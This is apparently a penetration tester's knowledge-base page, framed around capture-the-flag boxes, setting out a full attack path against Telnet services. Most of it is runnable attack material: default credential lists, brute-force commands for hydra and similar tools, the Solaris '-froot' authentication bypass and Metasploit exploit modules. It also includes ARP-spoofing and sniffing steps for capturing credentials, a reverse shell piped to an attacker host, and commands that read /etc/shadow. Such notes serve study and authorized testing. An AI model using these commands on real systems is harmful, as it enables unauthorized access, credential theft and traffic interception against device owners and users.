---
title: "Telnet (Port 23) Attack Path"
type: technique
tags: [brute-force, credentials, enumeration, exploitation, htb, network, telnet]
phase: exploitation
date_created: 2026-05-29
date_updated: 2026-05-29
sources: [session-2026-05-29]
---

# Telnet (Port 23) Attack Path

## What It Is

Telnet is a cleartext remote-shell protocol on TCP/23. It transmits credentials and session data unencrypted, exposing brute-force, sniffing, and protocol-level RCE attack surface. Telnet is rare on modern servers but common on embedded devices (routers, switches, IoT, IPMI, Solaris boxes) and intentionally exposed CTF targets.

## General Approach

1. **Banner grab** — identify OS, firmware, telnetd implementation.
2. **Default / blank credentials** — embedded gear and CTF boxes almost always have known defaults.
3. **Brute force** — hydra/medusa/ncrack with low concurrency (telnet rate-limits).
4. **Protocol exploits** — CVE matched to banner (Solaris, FreeBSD, Inetutils, netkit).
5. **Sniff cleartext** — if MITM possible on LAN, ARP-spoof + tcpdump for creds.
6. **Post-shell** — standard Linux/embedded enumeration; pivot.

---

## Enumeration

### Nmap

```sh
nmap -sV -sC -p23 <IP>
nmap -p23 --script telnet-encryption,telnet-ntlm-info,telnet-brute <IP>
```

`telnet-ntlm-info` is highly valuable on Windows hosts: leaks hostname, domain, OS build via NTLM challenge.

### Manual Banner Grab

```sh
nc -nv <IP> 23
telnet <IP> 23
```

Banner often reveals:
- BusyBox (embedded Linux router/IoT)
- Cisco IOS / NX-OS
- Solaris `SunOS` `login:` prompt
- Windows Server Telnet Service
- Metasploitable / Kali training boxes
- IPMI/BMC consoles (Supermicro, iLO via serial-over-LAN)

---

## Default Credentials

Always try before brute-forcing. CTF + embedded coverage:

```
root:(blank)
root:root
root:toor
root:calvin           # Dell iDRAC
root:admin
admin:admin
admin:password
admin:(blank)
cisco:cisco
ubnt:ubnt             # Ubiquiti
pi:raspberry          # Raspberry Pi
msfadmin:msfadmin     # Metasploitable
service:service
support:support
guest:guest
user:user
```

Solaris-specific (try when banner shows SunOS):
```
bin:(blank)
sys:(blank)
adm:(blank)
lp:(blank)
nuucp:(blank)
```

CTF wordlist: also try the box theme (movie/character/colour names from the challenge description).

---

## Brute Force

```sh
# Hydra — keep -t low; telnet rate-limits hard
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt telnet://<IP> -t 4 -f
hydra -l root -P rockyou.txt <IP> telnet -V

# Medusa
medusa -h <IP> -U users.txt -P passwords.txt -M telnet

# Ncrack
ncrack -p 23 --user root -P rockyou.txt <IP>

# Patator (when hydra/medusa misread prompts)
patator telnet_login host=<IP> user=root password=FILE0 0=rockyou.txt persistent=0
```

Tuning:
- `-t 4` max; higher gets dropped connections, false negatives.
- `-f` to halt on first hit (saves time when you only need one creds pair).
- Try `-l root` first; root login is the most common misconfiguration.

---

## CVE Exploits by Banner

| CVE | Target | Effect |
|---|---|---|
| CVE-2007-0882 | Solaris 10/11 `in.telnetd` | `telnet -l "-froot" <IP>` → instant root, no creds |
| CVE-2011-4862 | FreeBSD / Linux telnetd `encrypt_keyid` | Pre-auth RCE; MSF `freebsd/telnet/telnet_encrypt_keyid` |
| CVE-2020-10188 | netkit-telnetd / Inetutils | Buffer overflow via NEW-ENVIRON option, RCE |
| Cisco IOS various | Cisco telnet auth bypass | MSF brute + cred reuse |
| Netgear DGN1000/2200 | `telnetenable` magic packet | MSF `linux/telnet/netgear_telnetenable` |

### Solaris One-Shot (CVE-2007-0882)

The single most famous telnet trick. Works against unpatched Solaris 10/11:

```sh
telnet -l "-froot" <IP>
# or
telnet -l "-fbin" <IP>
```

`-f` argument passes flag to `login` bypassing auth → root shell instantly.

### Metasploit Modules

```
use auxiliary/scanner/telnet/telnet_version
use auxiliary/scanner/telnet/telnet_login
use auxiliary/scanner/telnet/lantronix_telnet_password
use auxiliary/scanner/telnet/satel_cmd_exec
use exploit/freebsd/telnet/telnet_encrypt_keyid
use exploit/linux/telnet/netgear_telnetenable
use exploit/solaris/telnet/fuser
use exploit/solaris/telnet/ttyprompt
use exploit/windows/telnet/goodtech_telnet
```

---

## Cleartext Sniffing

If on the same LAN segment as victim or with MITM position:

```sh
# ARP spoof victim ↔ gateway
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t <victim_IP> <gateway_IP>
sudo arpspoof -i eth0 -t <gateway_IP> <victim_IP>

# Capture telnet traffic
sudo tcpdump -i eth0 -A -s 0 'tcp port 23' -w telnet.pcap

# Extract creds from pcap
tshark -r telnet.pcap -Y telnet -T fields -e telnet.data
# or in Wireshark: Follow → TCP Stream
```

Telnet sends keystrokes one byte per packet during login. Use Wireshark "Follow TCP Stream" or `strings` on the pcap to reconstruct typed credentials.

---

## Reverse Telnet (Egress Test)

Useful when target outbound is filtered and only port 23 returns:

```sh
# Attacker
nc -lvnp 23

# Target
mknod /tmp/p p
/bin/sh 0</tmp/p | telnet <ATTACKER> 23 1>/tmp/p
```

---

## Post-Shell

```sh
id; uname -a; hostname
cat /etc/passwd; cat /etc/shadow 2>/dev/null
sudo -l
ip a; netstat -tulnp
```

Pivot via [[pivoting-tunneling]]. Linux privesc via [[linux-enumeration]]. If embedded BusyBox: check for writable `/etc`, weak `/var`, and exposed configuration interfaces.

---

## CTF Tells

| Banner sign | Try first |
|---|---|
| `SunOS` / `login:` Solaris | `telnet -l "-froot" <IP>` |
| `BusyBox` | `root:(blank)`, `root:root`, `admin:admin` |
| `Welcome to Microsoft Telnet Service` | NTLM info script, then user list spray |
| Cisco `User Access Verification` | `cisco:cisco`, then enable password brute |
| Metasploitable | `msfadmin:msfadmin` |
| Custom theme (movie/character) | Generate wordlist from challenge text |
| Hostname in banner | Add to userlist; vendor often == default user |

Decision tree:
1. Banner matches known CVE → exploit, done.
2. Banner matches known default → try defaults, done.
3. Neither → hydra with rockyou + theme-derived list, low `-t`.
4. Still stuck → sniff if pivoted; revisit other ports (web admin often exposes telnet enable).

## Related

- [[service-enumeration]] — protocol enumeration general patterns
- [[network-service-attacks]] — sibling services (FTP/SMB/RDP)
- [[network-services]] — quick-reference cheatsheet
- [[password-attacks]] — hydra/medusa/ncrack and wordlist tooling
- [[pivoting-tunneling]] — post-shell pivot
